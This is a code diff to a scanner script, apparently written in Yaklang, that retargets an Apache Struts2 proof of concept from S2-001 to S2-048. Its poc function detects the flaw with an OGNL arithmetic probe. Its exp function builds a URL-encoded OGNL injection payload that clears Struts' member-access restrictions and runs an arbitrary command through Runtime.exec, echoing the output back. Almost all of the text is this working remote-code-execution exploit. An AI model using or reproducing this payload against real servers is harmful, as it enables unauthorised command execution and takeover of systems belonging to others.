@@ -6,7 +6,7 @@ func poc(url){
     num2 = randn(10000,100000)
 
 
-    check_poc = sprintf("%s%d%s%d%s","%25%7B",num1,"%2B",num2,"%7D")
+    check_poc = sprintf("%s%d%s%d%s","%24%7B",num1,"%2B",num2,"%7D")
     req, err = http.Post(
         url,
         http.useragent(http.uarand()),
@@ -17,9 +17,9 @@ func poc(url){
         return
     }
     if re.Match(parseStr(num1+num2),http.GetAllBody(req)){
-        log.warn( url + " S2_001 found !!!")
+        log.warn( url + " S2_048 found !!!")
     }else{
-        log.debug(url + " S2_001 safe !!!")
+        log.debug(url + " S2_048 safe !!!")
     }
     
 }
@@ -27,8 +27,7 @@ func poc(url){
 
 //定义利用函数
 func exp(url,cmd){
-    payload = codec.EscapeQueryUrl("\""+str.Join(str.Split(cmd," "),"\",\"")+"\"")
-    exec_payload = "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B"+payload+"%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"
+    exec_payload = `%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('`+cmd+`').getInputStream())).(%23q)%7D`
                     
     req, err = http.Post(
         url,
